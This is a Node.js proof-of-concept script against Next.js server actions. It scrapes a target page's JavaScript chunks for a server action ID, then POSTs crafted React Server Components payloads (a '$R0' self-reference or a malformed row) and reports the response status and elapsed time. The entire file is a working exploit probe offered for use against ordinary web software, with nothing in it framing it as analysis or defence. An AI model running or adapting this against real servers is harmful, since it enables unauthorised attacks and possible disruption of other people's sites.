#!/usr/bin/env node
"use strict";

/*
   _____              .___                       _____         .__                   __
  /  _  \   ____    __| _/______   ______  _  __/     \   ____ |  |__ _____ __  _  _|  | __
 /  /_\  \ /    \  / __ |\_  __ \_/ __ \ \/ \/ /  \ /  \ /  _ \|  |  \\__  \\ \/ \/ /  |/ /
/    |    \   |  \/ /_/ | |  | \/\  ___/\     /    Y    (  <_> )   Y  \/ __ \\     /|    <
\____|__  /___|  /\____ | |__|    \___  >\/\_/\____|__  /\____/|___|  (____  /\/\_/ |__|_ \
        \/     \/      \/             \/              \/            \/     \/            \/
MaltegoIsNotAChicken
6tL"BDImisFCe9WEccS+Bl.D
*/

const ACTION_ID_PATTERN = /[a-f0-9]{42}/g;
const BROWSER_HEADERS = {
  "User-Agent": "Mozilla/5.0",
  Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "Accept-Language": "en-US,en;q=0.9",
  "Cache-Control": "no-cache",
};
const VALID_MODES = new Set(["selfref", "malformedrow"]);

function usage() {
  console.error("Usage: node poc-reference-row-resolution.js [target] [mode]");
  console.error("Modes: selfref | malformedrow");
  console.error("Example: node poc-reference-row-resolution.js http://127.0.0.1:3000/test selfref");
}

function normalizeTarget(input) {
  const raw = input || process.env.TARGET_URL || "http://127.0.0.1:3000/test";
  return new URL(raw.startsWith("http") ? raw : `http://${raw}`).toString();
}

async function fetchText(url, options = {}, timeoutMs = 10000) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  try {
    const res = await fetch(url, { ...options, signal: controller.signal });
    return { status: res.status, text: await res.text() };
  } finally {
    clearTimeout(timer);
  }
}

function extractJsUrls(html, baseUrl) {
  const urls = new Set();
  const srcPattern = /src=["']([^"']*\.js[^"']*)["']/g;
  const chunkPattern = /_next\/static\/chunks\/[^"'\s]+\.js/g;
  let m;
  while ((m = srcPattern.exec(html)) !== null) urls.add(new URL(m[1], baseUrl).href);
  while ((m = chunkPattern.exec(html)) !== null) urls.add(new URL(m[0], baseUrl).href);
  return [...urls];
}

async function discoverActionId(targetUrl) {
  const page = await fetchText(targetUrl, { headers: BROWSER_HEADERS });
  for (const jsUrl of extractJsUrls(page.text, targetUrl)) {
    try {
      const js = await fetchText(jsUrl, { headers: BROWSER_HEADERS });
      ACTION_ID_PATTERN.lastIndex = 0;
      let m;
      while ((m = ACTION_ID_PATTERN.exec(js.text)) !== null) {
        if (m[0].startsWith("40")) return m[0];
      }
    } catch {
      // ignore chunk fetch failures
    }
  }
  return null;
}

async function main() {
  if (process.argv.includes("--help") || process.argv.includes("-h")) {
    usage();
    process.exit(0);
  }
  if (typeof fetch !== "function") throw new Error("Node.js 18+ required (global fetch).");

  const target = normalizeTarget(process.argv[2]);
  const mode = (process.argv[3] || process.env.MODE || "selfref").toLowerCase();
  if (!VALID_MODES.has(mode)) throw new Error(`Invalid mode '${mode}'. Use selfref or malformedrow.`);

  const actionId = process.env.NEXT_ACTION || process.env.ACTION_ID || (await discoverActionId(target));
  if (!actionId) throw new Error("Could not discover action ID. Set NEXT_ACTION to override.");

  const payload = mode === "malformedrow" ? '[{"id":0,"type":"$R0"}]' : '["$R0"]';

  const started = Date.now();
  const res = await fetch(target, {
    method: "POST",
    headers: {
      Accept: "text/x-component",
      "Content-Type": "text/plain;charset=UTF-8",
      "Next-Action": actionId,
      Origin: new URL(target).origin,
      Referer: target,
    },
    body: payload,
  });

  const text = await res.text();
  console.log(
    JSON.stringify(
      {
        target,
        actionId,
        mode,
        payload,
        status: res.status,
        elapsedMs: Date.now() - started,
        bodyPreview: text.slice(0, 400),
      },
      null,
      2
    )
  );
}

main().catch((err) => {
  console.error(err.message || err);
  process.exit(1);
});
